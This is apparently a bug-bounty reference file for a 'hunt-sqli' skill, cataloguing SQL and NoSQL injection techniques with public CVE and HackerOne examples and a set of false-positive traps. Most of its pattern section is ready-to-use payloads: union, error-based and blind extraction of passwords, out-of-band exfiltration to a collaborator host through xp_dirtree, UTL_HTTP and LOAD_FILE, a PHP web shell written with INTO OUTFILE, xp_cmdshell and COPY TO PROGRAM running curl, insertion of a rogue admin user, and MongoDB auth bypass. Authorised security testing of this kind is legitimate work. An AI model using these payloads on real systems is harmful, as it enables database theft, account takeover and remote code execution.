# hunt-sqli — Pattern Library

> Patterns and verifiable public examples behind `hunt-sqli`. Operator-grade reference, not a complete enumeration. Cited examples are widely-discussed public cases that any reader can search and verify; uncited patterns are general operator knowledge accumulated from public bounty disclosures, CVEs, and database documentation.

SQL injection has been on the OWASP Top 10 since 2003 and still pays out at the top of the table whenever it surfaces, because the proof is unambiguous (a row returned that should not have been, a measurable time delta, a string from `information_schema`) and the blast radius is the entire data tier behind the application. The patterns below are organized by *signal channel* — error-based, boolean blind, time-based blind, out-of-band, second-order, and operator injection — because in 2025 the days of "single quote breaks the page" are mostly over and the operator wins by knowing which channel survives the framework, the WAF, and the input filter.

## Cited Public Examples

### Apache Struts OGNL injection (CVE-2017-5638) — Equifax-class exfil
- **Source:** Apache Software Foundation security advisory S2-045 / S2-046 from March 2017. CVE-2017-5638. CISA Known Exploited Vulnerabilities catalogue. Equifax post-mortem (US Government Accountability Office report GAO-18-559) cites this CVE as the entry point for the breach that exposed ~147 million records.
- **Pattern shape:** Strictly speaking this is OGNL injection in the Jakarta multipart parser, not SQL injection — but it belongs in any SQLi pattern library because the operator lesson is identical: *attacker-controlled bytes reached an interpreter that the application never advertised as user-input-facing*. The `Content-Type` header was parsed by an OGNL evaluator, and the resulting code execution was used to query the backend database directly without any application-level query at all.
- **Key trick:** When the application is hardened against classical `' OR 1=1`, the attacker stops fighting the WAF and goes a layer deeper — direct DB access via deserialization, OGNL, SpEL, JNDI, or whatever expression language is reachable. The Equifax pattern is the canonical demonstration that "we use prepared statements everywhere" does not protect the data tier when there is a sibling RCE.
- **Why it matters:** Always cross-test SQLi candidates with the equivalent template-injection / expression-language probes from `hunt-ssti` and `hunt-rce`. Same input vector, different interpreter, often higher payout.

### OWASP SQL Injection Prevention Cheat Sheet (canonical prevention reference)
- **Source:** OWASP Foundation, SQL Injection Prevention Cheat Sheet, owasp.org/www-project-cheat-sheets/. Authored and reviewed over many years by the OWASP cheat-sheet project leadership; cited in framework docs across Python, Java, .NET, Node, Ruby, and PHP.
- **Pattern shape:** The cheat sheet enumerates the *only* safe primitives — parameterized queries / prepared statements, stored procedures with bound parameters, allow-list input validation for non-parameterizable identifiers (table names, ORDER BY columns), and ORM constructs that never concatenate. Anything else is presumptively unsafe.
- **Key trick:** The operator value is the *inverse* of the cheat sheet — for every "safe pattern" the document recommends, identify the corresponding unsafe pattern grep can find in source: `"SELECT ... " + var`, `f"SELECT ... {var}"`, string interpolation in SQL string builders, ORDER BY clauses that can't be bound and are escaped by hand.
- **Why it matters:** When you have source-code access (greybox, public GitHub mirrors, leaked `.git` directories), grep the cheat sheet's anti-patterns and you will routinely find SQLi candidates the dynamic scanner missed.

### HackerOne hacktivity — widely-documented SQLi disclosures across GitHub, Uber, Shopify, Verizon
- **Source:** HackerOne's public hacktivity feed (hackerone.com/hacktivity) contains hundreds of SQLi disclosures across major programs. The class is well-documented as a category — cite the body of disclosed reports rather than individual report IDs (which can change disclosure status).
- **Pattern shape:** The recurring shape across public disclosures: a *non-obvious* parameter (HTTP header, second-order field, JSON sub-object) reached a query construction that the primary parameter-validation layer never inspected. Top examples that recur across programs: tracking subdomain parameters, third-party plugins on enterprise WordPress installs, internal admin tools exposed externally (Airflow, GitLab, Jenkins), regional `.cn` / `.co` / `.io` variants on a slower patch cadence.
- **Key trick:** Hunt the *attack surface periphery*. The flagship API on `api.target.com` has been hardened by ten years of pentests. The marketing site on `events.target.com` running an unmaintained WordPress plugin has not.
- **Why it matters:** SQLi-as-a-class still pays because new attack surface gets added faster than old surface gets audited. Recon discipline (subdomain enum, parameter mining, JS bundle harvest) determines whether you find the candidate at all.

### MSSQL `xp_dirtree` UNC-path OOB exfiltration (well-documented operator pattern)
- **Source:** Microsoft SQL Server documentation for the undocumented `xp_dirtree` and `xp_fileexist` extended stored procedures. The OOB exfil pattern via UNC paths is referenced in PortSwigger Web Security Academy SQLi labs, MSSQL pentest cheat sheets, and `sqlmap` source.
- **Pattern shape:** When boolean blind and time-based blind are both noisy on an MSSQL backend, the operator escalates to OOB via `EXEC master..xp_dirtree '\\\\<collab>\\x'`. The MSSQL service account opens an SMB / DNS lookup against the attacker-controlled host. DNS-only OOB (no SMB) is enough to validate.
- **Key trick:** Cross-database OOB primitives differ. MSSQL → `xp_dirtree`. Oracle → `UTL_HTTP.REQUEST` or `HTTP_URI_TYPE` or `DBMS_LDAP.INIT`. PostgreSQL → `COPY ... TO PROGRAM` (RCE-tier) or `dblink_connect`. MySQL → `LOAD_FILE('\\\\<collab>\\x')` on Windows hosts, harder on Linux.
- **Why it matters:** Time-based blind on a fast network is unreliable — 5-second sleeps get statistically washed out by network jitter on cloud-fronted targets. OOB gives a clean binary signal: callback or no callback.

---

### Unvalidated parameter → SQL injection → data extraction
- **Source:** An unvalidated parameter on a reporting page enabling reads of SQL data (<https://hackerone.com/reports/383127>, $25,000); SQL injection in a public dashboard endpoint (<https://hackerone.com/reports/297478>); SQLi in a CMS plugin (<https://hackerone.com/reports/273946>, $4,500).
- **Pattern shape:** A request parameter (search, filter, id, sort, an XML/report generator) is concatenated into a SQL query without parameterization. Classic union-based, error-based, or boolean/time-blind extraction of arbitrary tables follows.
- **Key trick:** Fuzz every parameter (including headers, JSON fields, and XML values) with `'`, `"`, `)`, and boolean pairs (`1 AND 1=1` vs `1 AND 1=2`); confirm a differential. For blind, use time delays; for stacked, test the DB's separator. Legacy report/export endpoints (`*.php?...xml`) are recurring high-value spots.
- **Why it matters:** Direct database read; still pays top-tier ($25k here) on legacy/partner endpoints scanners miss.

### SQLi in a backend service / ORM layer
- **Source:** A SQL injection in a web service backed by MS SQL Server (<https://hackerone.com/reports/531051>).
- **Pattern shape:** The injection is not in the obvious web form but in a downstream service, an ORM raw-query escape hatch, or an internal API that trusts an upstream-supplied value. The DB engine (MSSQL/Postgres/MySQL) determines the exploitation primitives (stacked queries, `xp_cmdshell`, `COPY ... TO PROGRAM`).
- **Key trick:** Trace parameters that flow to internal services; test ORM raw-query endpoints and search DSLs. Identify the engine (error strings, timing) to pick the right escalation (MSSQL `xp_cmdshell` → RCE).
- **Why it matters:** Backend SQLi often escalates to RCE via DB-specific features; overlaps `hunt-rce`.

### Further disclosed reports (this class)

Additional high-signal public disclosures exemplifying the patterns above; read at source for full technique.

- <https://hackerone.com/reports/403616> — $4500
- <https://hackerone.com/reports/2051931> — $4134
- <https://hackerone.com/reports/150156> — $4000
- <https://hackerone.com/reports/2646493> — $4263
- <https://hackerone.com/reports/1044716> — $2000
- <https://hackerone.com/reports/125932> — $3000
- <https://hackerone.com/reports/952501> — $2000
- <https://hackerone.com/reports/761304> — $0
- <https://hackerone.com/reports/206872> — $2500
- <https://hackerone.com/reports/476150> — $2500
- <https://hackerone.com/reports/838855> — $2000
- <https://hackerone.com/reports/836079> — $2000
- <https://hackerone.com/reports/1895277> — $2400
- <https://hackerone.com/reports/298176> — $2000
- <https://hackerone.com/reports/962889> — $0
- <https://hackerone.com/reports/592400> — $0
- <https://hackerone.com/reports/549355> — $0
- <https://hackerone.com/reports/361623> — $1500
- <https://hackerone.com/reports/300176> — $1000
- <https://hackerone.com/reports/1039315> — $0
- <https://hackerone.com/reports/1224660> — $0
- <https://hackerone.com/reports/358669> — $1000
- <https://hackerone.com/reports/258582> — $1000
- <https://hackerone.com/reports/297534> — $1000
- <https://hackerone.com/reports/301257> — $1000

## Pattern Library

### Classic union-based extraction
- **When to suspect:** Numeric or string parameter reflected into a query whose result set is rendered in the response (search, listing, filter). Quote insertion produces a 500 or a visible error fragment.
- **Test:** Determine column count via `' ORDER BY 1--`, `' ORDER BY 2--`, ... incrementing until error. Then `' UNION SELECT NULL,NULL,NULL--` matching count. Replace NULLs progressively with `1`, `'a'`, `database()`, `version()`, `current_user`, then `group_concat(table_name)` from `information_schema.tables WHERE table_schema=database()`.
- **Validation:** Rendered response contains the injected literal (e.g. `MySQL 8.0.36`) at the position where it could only have arrived via UNION. Confirm with statistical sampling — five clean baseline requests, five injected requests, the marker appears only in the injected responses.
- **Pay-grade rationale:** Critical when the table reached holds PII or auth material; high otherwise. Union-based is the cleanest proof, so triagers accept it without debate.

### Error-based extraction (MSSQL / Oracle / Postgres / MySQL)
- **When to suspect:** Server returns DB error text or stack-trace fragments when a malformed input is sent. `customErrors` is off, debug mode is on, or the framework leaks `SqlException` messages.
- **Test:** Engine-specific error-coercion payloads:
  - **MSSQL:** `' AND 1=CONVERT(int,(SELECT @@version))--` — error returns `Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019...' to data type int.`
  - **Oracle:** `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--` or older `' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--`.
  - **PostgreSQL:** `' AND 1=CAST((SELECT version()) AS int)--` — error includes the version string.
  - **MySQL (5.x):** `' AND extractvalue(1,concat(0x7e,(SELECT version())))--` or `' AND updatexml(1,concat(0x7e,(SELECT version())),1)--`.
- **Validation:** The DB string appears verbatim in the response inside the error message — unmistakable proof.
- **Pay-grade rationale:** Critical. Error-based extraction is often faster than UNION (no column count) and produces unambiguous PoC text.

### Boolean blind via response-body diff
- **When to suspect:** No error visible, no rendered query result, but the response *content* changes when the underlying boolean changes (e.g. "Welcome back" vs. "Invalid login", or item count, or a CSS class).
- **Test:** Pair true/false probes — `' AND 1=1--` vs `' AND 1=2--`. If the body differs in a *content-meaningful* way (not just a timestamp or a CSRF token), the boolean is observable. Extract bit-by-bit: `' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>64--`.
- **Validation:** Body-Diff Rule — diff the two responses with `diff <(curl ... true) <(curl ... false)` and confirm the difference is stable across 10 paired requests. A diff that flips randomly on identical input is noise, not a boolean oracle.
- **Pay-grade rationale:** High to critical. Slower than union but works through most filters.

### Time-based blind (cross-database)
- **When to suspect:** Boolean diff is invisible (response always 200 with identical body) but a query is still being executed.
- **Test:**
  - **MySQL:** `' AND SLEEP(5)--` or `' AND IF(1=1, SLEEP(5), 0)--`.
  - **PostgreSQL:** `'; SELECT pg_sleep(5)--` or `' AND (SELECT 1 FROM pg_sleep(5)) IS NOT NULL--`.
  - **MSSQL:** `'; WAITFOR DELAY '0:0:5'--` or `' IF (1=1) WAITFOR DELAY '0:0:5'--`.
  - **Oracle:** `' AND 1=(DBMS_PIPE.RECEIVE_MESSAGE(('a'),5))--`.
  - **SQLite:** Burn CPU via `RANDOMBLOB(100000000)` — SQLite has no native sleep.
- **Validation:** Statistical sampling — run 10 baseline (no payload) and 10 injected requests. Mean injected response time must exceed mean baseline by at least the sleep duration with confidence (standard deviation < sleep/3). A single slow response is not proof; ten reliably-slow responses are.
- **Pay-grade rationale:** High to critical. Time-based is the slowest channel; report only after statistical confirmation, never on one observation.

### Out-of-band exfil via DNS / SMB (MSSQL, Oracle, PostgreSQL)
- **When to suspect:** Time-based is noisy, network jitter washes out the signal, or you want an unambiguous binary OOB callback.
- **Test:**
  - **MSSQL:** `'; EXEC master..xp_dirtree '\\\\<collab-subdomain>\\x'--` — DNS lookup of `<collab-subdomain>` fires from the MSSQL service account.
  - **Oracle:** `' AND 1=UTL_HTTP.REQUEST('http://<collab>/')--` or `' AND 1=(SELECT DBMS_LDAP.INIT('<collab>',80) FROM dual)--`.
  - **PostgreSQL:** `'; COPY (SELECT '') TO PROGRAM 'curl http://<collab>/'--` (RCE-tier, requires superuser) or `'; SELECT dblink_connect('host=<collab> user=a dbname=a')--`.
  - **MySQL:** `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.<collab>\\\\x'))--` — exfils data into the DNS hostname (Windows hosts only).
- **Validation:** Collaborator DNS interaction with a unique sub-tag per sink (`mssql-1.<collab>`, `oracle-search.<collab>`) — eliminates ambiguity about which parameter fired.
- **Pay-grade rationale:** Critical when DB superuser. Even DNS-only OOB without exfil is a clean SQLi proof when timing is unreliable.

### Second-order SQL injection (stored-then-triggered)
- **When to suspect:** Application stores user input (registration form, profile field, comment, support ticket) and later replays that stored value into a query (admin search, scheduled report, log analysis pipeline).
- **Test:** Register username `admin'--` or `' OR 1=1--`. Trigger the second-order code path (visit admin UI, fire scheduled job, wait for digest email). Watch for the injection firing on retrieval, not on store.
- **Validation:** OOB callback or boolean/time-based effect on the *second* code path, with the stored payload unchanged in the DB.
- **Pay-grade rationale:** Critical. Second-order routinely bypasses the input-validation layer entirely because validation runs on first-write, not on later-read.

### Header-based injection (User-Agent, Cookie, X-Forwarded-For)
- **When to suspect:** Application logs requests into a SQL table (audit log, analytics, rate-limit table). Headers are logged without parameterization. Often invisible until log-replay or admin-search code path runs.
- **Test:** `User-Agent: ' AND SLEEP(5)--`. Confirm via timing on the log-replay endpoint (admin dashboard, log search, analytics) — *not* on the original request that just stored the value.
- **Validation:** OOB callback or timing delta on the secondary code path. Eliminate WAF-side timing by also confirming the original request returns at baseline speed.
- **Pay-grade rationale:** High to critical. Bypasses every parameter-focused WAF rule because the header is treated as "trusted server-side metadata."

### ORDER BY / GROUP BY clause injection (the un-parameterizable column)
- **When to suspect:** Sortable column list in a UI (`sort=price`, `order=desc`). Column names cannot be bound — developer either allow-lists them or builds the clause by concatenation.
- **Test:** `sort=(CASE WHEN (SELECT version() LIKE 'PostgreSQL%') THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)` — produces a runtime error on PostgreSQL only when the boolean is true (subquery returns multiple rows in a scalar context).
- **Validation:** Boolean-channel error appears/disappears with the true/false branch. Confirm with five paired requests.
- **Pay-grade rationale:** High. Most WAFs miss ORDER BY context because they're looking for keywords inside `WHERE` clauses.

### MongoDB / NoSQL operator injection
- **When to suspect:** Node.js + MongoDB stack. JSON body with username/password fields. PHP / Express that accepts `param[$ne]=value` in query strings (Express body-parser converts to objects automatically).
- **Test:** Auth bypass — `{"username":{"$ne":null},"password":{"$ne":null}}` returns the first user in the collection. Data extraction — `{"username":{"$regex":"^a"},"password":{"$ne":null}}` and bit-iterate. Code injection in `$where` — `{"$where":"this.username == 'admin' && this.password.length > 0"}` (only on MongoDB with `--javascriptEnabled`).
- **Validation:** Login succeeds with no valid password, or `$regex` enumeration yields the username one prefix-character at a time.
- **Pay-grade rationale:** Critical when auth bypass. High when data enumeration only.

### `$where` JavaScript injection on MongoDB
- **When to suspect:** MongoDB ≤ 4.4 with `--javascriptEnabled` (default for legacy installs). Search endpoint that accepts `$where` from user input.
- **Test:** `{"$where":"sleep(5000) || 1==1"}` — server-side JS sleep. Confirms code execution in the DB process.
- **Validation:** Statistical timing as for SQL time-based.
- **Pay-grade rationale:** Critical. `$where` is effectively eval-on-the-DB-server.

### JSON-path / GraphQL-where injection (object-shaped query)
- **When to suspect:** Modern API that accepts a `where` clause as JSON: `{"where":{"id":{"_eq":1}}}`. Hasura, PostgREST, Apollo+Prisma, Strapi.
- **Test:** Add unintended operators — `{"where":{"role":{"_eq":"admin"}}}` retrieves admin rows; `{"where":{"password_hash":{"_starts_with":"a"}}}` enumerates a column the schema declared as not-selectable. Authorization at the resolver layer often misses field-level checks.
- **Validation:** Response contains data the current session should not see (cross-tenant or higher-role row).
- **Pay-grade rationale:** Critical when the layer trusts the where-clause shape.

### `LOAD DATA LOCAL INFILE` / `INTO OUTFILE` file primitives
- **When to suspect:** MySQL with full SQLi confirmed. `--secure-file-priv` empty or set to a writable directory. Web root writable by the MySQL user.
- **Test:** `' UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--`. Then `GET /shell.php?c=id`.
- **Validation:** Shell file is reachable over HTTP, command output reflected.
- **Pay-grade rationale:** Critical (RCE escalation from SQLi).

### MSSQL `xp_cmdshell` → RCE
- **When to suspect:** MSSQL with full SQLi confirmed, `sa` or sysadmin-equivalent context.
- **Test:** `'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--` then `'; EXEC xp_cmdshell 'curl http://<collab>/'--`.
- **Validation:** OOB callback proves command execution as the MSSQL service account.
- **Pay-grade rationale:** Critical. RCE on the database host with whatever privileges the service runs as (often `NETWORK SERVICE` or worse — `LOCAL SYSTEM` on legacy installs).

### PostgreSQL `COPY ... FROM PROGRAM` → RCE
- **When to suspect:** PostgreSQL ≥ 9.3 with full SQLi confirmed, current user has `pg_execute_server_program` role or is superuser.
- **Test:** `'; CREATE TABLE x(c text); COPY x FROM PROGRAM 'curl http://<collab>/';--` or `'; COPY (SELECT '') TO PROGRAM 'id > /tmp/x';--`.
- **Validation:** OOB callback or filesystem artifact.
- **Pay-grade rationale:** Critical.

### Stacked-query injection
- **When to suspect:** Connector supports multiple statements per call. PHP `mysqli_multi_query`, Node `mysql2` with `multipleStatements: true`, .NET `SqlCommand` (default-on).
- **Test:** `1; INSERT INTO users(username, role) VALUES ('attacker', 'admin');--`. Verify by logging in as the new user.
- **Validation:** Side-effect persists in DB state.
- **Pay-grade rationale:** Critical. Often unauthenticated privilege escalation.

---

## Anti-Patterns (FP traps)

### 500 error from malformed input claimed as SQLi
- **Looks like:** You insert a single quote, the server returns 500. You assume the quote broke a query.
- **Actually is:** Input-validation layer threw an exception before any query was constructed. Frameworks routinely throw 500 on malformed bodies, mismatched JSON, type-coerce failures, or strict-mode-disabled-but-still-validating regexes.
- **How to disprove:** **Body-Diff Rule.** Compare the 500's body to the 500 produced by *intentionally invalid* non-SQL input (e.g., the parameter set to a 10MB random string, or an emoji where an integer is expected). If both 500s contain the same generic error page, the 500 says nothing about a query. Add a positive test — `' AND SLEEP(5)--` with statistical timing — before reporting.

### Response delta claimed as SQLi when the app silently strips/escapes
- **Looks like:** `?id=1` returns the same body as `?id=1' AND 1=1--`, but `?id=1' AND 1=2--` returns a different body. Looks like a boolean oracle.
- **Actually is:** The app may strip everything after `'` and re-execute the query as `?id=1`, hence the "true" branch matches baseline. The "false" branch differs because the same stripping produced a different stripped output (or because the input validator returned a fixed error template only on the longer second payload).
- **How to disprove:** Run the boolean both ways without quotes — `1 AND 1=1` vs `1 AND 1=2` as raw integers. If quoted and unquoted forms give the same diff signal, you have a real boolean. If only the quoted form does, you might be observing the stripping pipeline, not the query. Confirm with timing — a real boolean injection paired with `SLEEP(5)` produces a timing delta; a stripping artefact does not.

### "MySQL error" string in response is the WAF, not the backend
- **Looks like:** Response body contains `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...`. Looks like a real DB error leak.
- **Actually is:** Many WAFs (ModSecurity OWASP CRS, Akamai, Cloudflare custom rules) return a *fake* MySQL error message as a deception / canary. The actual backend may be PostgreSQL, SQL Server, or no SQL at all.
- **How to disprove:** Confirm the backend via a positive non-WAF signal — engine-specific syntax that *only* MySQL accepts (e.g. `'; SELECT @@version;--` returning a MySQL-formatted version) succeeded as a real query. If every "error" is identical regardless of the payload shape and you see no positive engine signal, the error is decoration on a WAF block page.

### Time delta from network jitter claimed as time-based blind
- **Looks like:** Your `SLEEP(5)` request took 6 seconds; baseline took 1 second. Looks like 5-second sleep fired.
- **Actually is:** A single observation. Cloud-fronted targets routinely have 1–10 second response-time variance under load.
- **How to disprove:** **Statistical sampling.** Send 10 baseline and 10 injected requests. Compute mean and standard deviation. If `mean(injected) - mean(baseline) < sleep_duration` or if standard deviation exceeds `sleep_duration / 3`, the signal is noise. Switch to OOB (`xp_dirtree`, `UTL_HTTP`, DNS exfil) for binary confirmation. Marker Discipline: tag each request with a unique cookie/parameter so server-side rate-limiting cannot conflate them.

### Login success on `' OR '1'='1` claimed as ATO via SQLi
- **Looks like:** Login form, payload `admin' OR '1'='1--` returns 200 with a session cookie. Looks like SQLi auth bypass.
- **Actually is:** Many modern login endpoints return 200 with a "generic failure" body and *no* session cookie regardless of input — to avoid user enumeration. The 200 is not a successful login.
- **How to disprove:** After the suspect "bypass," request an authenticated endpoint (`GET /api/me`) with the returned cookie. If the response is 401 or "anonymous," no auth happened. Server-policy vs. state — the server *says* "ok" but the *state* shows no session. Require an authenticated-state proof (returned email, balance, profile) before claiming ATO.
